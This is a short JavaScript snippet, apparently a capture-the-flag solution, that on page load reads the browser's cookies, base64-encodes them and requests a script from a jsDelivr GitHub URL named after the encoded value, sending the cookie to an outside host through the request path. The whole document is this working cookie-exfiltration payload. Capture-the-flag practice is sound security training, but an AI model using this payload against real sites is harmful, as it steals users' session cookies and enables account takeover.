window.addEventListener('DOMContentLoaded', () => {
    // Read the flag from the cookie
    let flag = document.cookie;
    
    // Encode it to Base64 and remove the '=' padding
    let safeFlag = btoa(flag).replace(/=/g, '');
    
    // Create a new script element
    let s = document.createElement('script');
    
    // Set the source to a NON-EXISTENT file on your repo, named after the flag
    s.src = `https://cdn.jsdelivr.net/gh/s25553258troy/PolyCTF2026@main/${safeFlag}.js`;
    
    // Append it to the page. This forces the bot to make the network request.
    document.head.appendChild(s);
});
